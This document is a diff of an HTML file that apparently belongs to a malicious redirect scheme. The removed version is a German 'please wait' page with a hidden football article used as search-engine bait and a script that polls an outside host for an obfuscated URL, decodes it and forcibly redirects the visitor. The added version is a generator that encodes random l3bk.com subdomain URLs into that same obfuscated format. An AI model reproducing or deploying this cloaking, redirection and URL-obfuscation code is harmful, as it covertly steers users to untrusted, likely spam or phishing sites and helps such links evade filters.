@@ -1,101 +1,68 @@
 <!DOCTYPE html>
-<html lang="de">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-  
-      <style>
- 
-.loader {
-  --d:22px;
-  width: 4px;
-  height: 4px;
-  border-radius: 50%;
-  color: #25b09b;
-  box-shadow: 
-    calc(1*var(--d))      calc(0*var(--d))     0 0,
-    calc(0.707*var(--d))  calc(0.707*var(--d)) 0 1px,
-    calc(0*var(--d))      calc(1*var(--d))     0 2px,
-    calc(-0.707*var(--d)) calc(0.707*var(--d)) 0 3px,
-    calc(-1*var(--d))     calc(0*var(--d))     0 4px,
-    calc(-0.707*var(--d)) calc(-0.707*var(--d))0 5px,
-    calc(0*var(--d))      calc(-1*var(--d))    0 6px;
-  animation: l27 1s infinite steps(8);
-}
-@keyframes l27 {
-  100% {transform: rotate(1turn)}
-}
-    </style>
-</head>
-<body><div class="center-div">
- Bitte warten...
-   <div style="display:none;">Marc-André ter Stegen hat sich am Sonntag schwer verletzt, musste unter Tränen vom Platz. Auch ein Konkurrent des DFB-Keepers trauerte mit.
+    <title>Hello world</title>
+    <script>
+        // Function to modify the URL
+        function modifyUrl(url) {
+            // Replace 'https' with '333'
+            url = url.replace('https', '333');
 
-Die Tränen Marc-André ter Stegens haben auch bei Thibaut Courtois Spuren hinterlassen. Der deutsche Nationaltorwart musste am Sonntag verletzt ausgewechselt werden. Barcelona befürchtet das vorzeitige Saison-Aus ter Stegens. Courtois meldete sich auf X zu Wort: "Es tut mir leid für die Verletzung. Es hat mir sehr weh getan, dich so vom Platz gehen zu sehen."
+            // Replace '.' with '222'
+            url = url.replace(/\./g, '222');
 
-Der Belgier kennt ter Stegens mögliche Realität gut, fiel selbst fast die komplette vergangene Saison aus. Courtois hatte sich einen Kreuzbandriss zugezogen, kehrte erst kurz vor dem Ende der Spielzeit zurück in den Kader. "Ich hoffe, du kannst dich bald erholen und wir sehen dich wieder im Tor", wünschte er nun dem verletzten DFB-Torwart.
-
-Marc-André ter Stegen (l.) mit Thibaut Courtois im März 2023: Die beiden Torhüter verbindet gegenseitiger Respekt.
-Vergrößern des Bildes
-Marc-André ter Stegen (l.) mit Thibaut Courtois im März 2023: Die beiden Torhüter verbindet gegenseitiger Respekt. (Quelle: IMAGO/Gerard Franco)
-"Es wird eine schwere Verletzung sein"
-Ter Stegen verletzte sich im Ligaspiel gegen Villarreal bei einer Flanke. Mit dem Ball in den Händen landete der 32-Jährige aber unsanft auf dem Rücken und dem rechten Bein und begann sofort unter Schmerzen zu schreien. Die umstehenden Spieler forderten umgehend medizinische Hilfe an.
-
-"Wir sind sehr glücklich über den Sieg, aber in Wahrheit traurig, weil ich glaube, dass es sich um eine schwere Verletzung handelt", sagte Trainer Hansi Flick nach dem 5:1 von Barcelona gegen den FC Villarreal, bei dem sich ter Stegen verletzt hatte. Beim Streamingdienst DAZN sagte der frühere Bundestrainer: "Wir müssen warten. Es wird eine schwere Verletzung sein. Das hat man sofort gesehen, als er auf dem Feld lag."
-
-arrow right
-Schock bei Barcelona-Spiel: DFB-Torwart ter Stegen droht wohl das Saison-Aus
-arrow right
-Dortmunder Debakel in Stuttgart: Kollaps beim VfB: BVB-Bosse sind sauer
-arrow right
-Zweitliga-Star hat sich entschieden: DFB-Team verliert Nachwuchstalent an anderes Land
-An­zei­ge Ak­ku-Mo­tor­sä­gen von STIHL für die Gar­ten­pfle­ge im Herbst
-Auch Bundestrainer Julian Nagelsmann wird genau hinschauen, wenn der FC Barcelona die finale Diagnose mitteilt, denn mit ter Stegen fällt nach dem Rücktritt von Manuel Neuer die neue Nummer eins im DFB-Tor aus.</div>
-  </div>
-  
-<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.18.0/js/md5.min.js"></script>
-<script>
-  $(document).ready(function() {
-    // Function to generate a random MD5 hash
-    function generateRandomMD5() {
-      const randomString = Math.random().toString(36).substr(2, 9);
-      return md5(randomString);
-    }
-
-    // Function to redirect user to a specified page
-    function redirectToPage(page) {
-      window.location.href = page;
-    }
-
-    function checkForRedirection() {
-      const randomMD5 = generateRandomMD5(); // Generate a random MD5 hash
-      const targetUrl = `https://shopping.geekhandbags.com/?${randomMD5}`; // Append the random MD5 hash to the URL
-
-      $.ajax({
-        url: targetUrl,
-        method: 'GET',
-        success: function(response) {
-          if (response !== "") {
-            let modifiedString = response.replace(/222/g, ".");
-            let modifiedString2 = modifiedString.replace(/333/g, "https");
-            redirectToPage(modifiedString2);
-          } else {
-            setTimeout(checkForRedirection, 5000); // Retry after 5 seconds if no redirection URL is received
-          }
-        },
-        error: function(xhr, status, error) {
-          console.error('Error fetching data:', error);
-          setTimeout(checkForRedirection, 5000); // Retry after 5 seconds on error
+            return url;
         }
-      });
-    }
 
-    // Start checking for redirection URL after a 3-second delay
-    setTimeout(checkForRedirection, 3000);
-  });
-</script>
+        // Function to generate a random MD5 hash equivalent
+        function generateRandomMD5() {
+            // Generate a random string using Math.random()
+            let randomString = Math.random().toString(36).substring(2) + Date.now().toString(36);
 
+            // Simulate MD5 by returning a pseudo-hash of the string
+            return btoa(randomString).substring(0, 32); // This won't be a true MD5, but a random 32 character string
+        }
+
+        // Function to generate a random number between minLength and maxLength digits
+        function generateRandomNumber(minLength, maxLength) {
+            const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+            const min = Math.pow(10, length - 1);
+            const max = Math.pow(10, length) - 1;
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+
+        // Function to generate a random string of 4 to 5 characters
+        function generateRandomString() {
+            const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            const length = Math.floor(Math.random() * 2) + 4; // Random length between 4 and 5
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return result;
+        }
+
+        // Function to generate and print URLs automatically on page load
+        function generateUrl() {
+            const randomMD5 = generateRandomMD5();
+            const randomString = generateRandomString();
+            const originalUrl = "https://pack-" + randomString + ".l3bk.com/#" + randomMD5;
+            const modifiedUrl = modifyUrl(originalUrl);
+
+            // Display the results
+            document.getElementById('originalUrl').textContent = "Original URL: " + originalUrl;
+            document.getElementById('modifiedUrl').textContent = "Modified URL: " + modifiedUrl;
+        }
+
+        // Automatically run the function when the page loads
+        window.onload = generateUrl;
+
+    </script>
+</head>
+<body>
+
+    <p id="modifiedUrl"></p>
 </body>
 </html>
